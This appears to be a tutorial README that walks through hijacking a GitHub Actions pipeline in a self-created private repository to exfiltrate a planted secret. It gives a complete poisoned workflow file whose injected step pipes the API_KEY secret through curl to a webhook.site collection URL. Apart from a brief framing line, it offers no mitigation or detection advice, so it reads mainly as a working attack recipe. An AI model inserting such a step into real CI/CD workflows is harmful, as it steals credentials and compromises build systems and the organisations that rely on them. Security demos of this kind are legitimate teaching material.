# Using CI/CD pipelines to infiltrate without dropping a shell

A demo that shows how to hijack a CI/CD pipeline and exfiltrate secrets — without ever dropping a reverse shell. This attack uses GitHub Actions and simulates real-world access to a compromised developer account.

---

## Prerequisites

Before you begin, make sure you have the following:

- **A GitHub account** (with permission to create private repositories).
- **Git installed and configured** on your machine.
  - You can verify by running: `git --version`
- **Internet access** to connect to GitHub and Webhook.site.
- **A browser** to:
  - Access [https://github.com](https://github.com)
  - Use [https://webhook.site](https://webhook.site) to receive the exfiltrated secret.
- **(Optional)** A GitHub personal access token (PAT) if you prefer pushing via HTTPS with authentication.

## Step 1: Create a simple GitHub repository

Login to your GitHub account and create a private repository named ci-cd-hijack-minimal. Then setup a repository on your local machine using the following commands:

```bash
mkdir ci-cd-hijack-minimal
cd ci-cd-hijack-minimal
echo "This is a test repo." > README.md
git init
git add .
git commit -m "Initial commit"
```
## Step 2: Create a GitHub Actions workflow

Create the folder:
```bash
mkdir -p .github/workflows
```
Then create .github/workflows/ci.yml:

```yaml
name: Minimal CI

on:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      API_KEY: ${{ secrets.API_KEY }}

    steps:
    - name: Checkout code
      uses: actions/checkout@v3

    - name: Print message
      run: echo "Build passed!"
```

## Step 3: Add a secret

Go to your GitHub repo > Settings > Secrets and Variables > Actions, and add:

- Name: `API_KEY`
- Value: `minimal_demo_secret_456`


## Step 4: Obtain WebHook URL

Go to [https://webhook.site/](https://webhook.site/) and copy the value shown in Your unique URL

## Step 5: Inject the malicious line

Now modify the workflow to include your exfiltration step (remember to replace `https://webhook.site/your-unique-id` with the URL you copied earlier):

```yaml
- name: Exfiltrate Secret
  run: |
    echo $API_KEY | curl -X POST -d @- https://webhook.site/your-unique-id
```

Full .github/workflows/ci.yml after injection:

```yaml
name: Minimal CI

on:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      API_KEY: ${{ secrets.API_KEY }}

    steps:
    - name: Checkout code
      uses: actions/checkout@v3

    - name: Exfiltrate Secret
      run: |
        echo $API_KEY | curl -X POST -d @- https://webhook.site/your-unique-id

    - name: Print message
      run: echo "Build passed!"
```

## Step 6: Push and trigger the workflow

git add .
git commit -m "Add basic CI workflow"
git branch -M main
git remote add origin https://github.com/your-username/ci-cd-hijack-minimal.git
git push -u origin main

Then watch the Actions tab in GitHub — and check your Webhook.site to see the stolen secret.

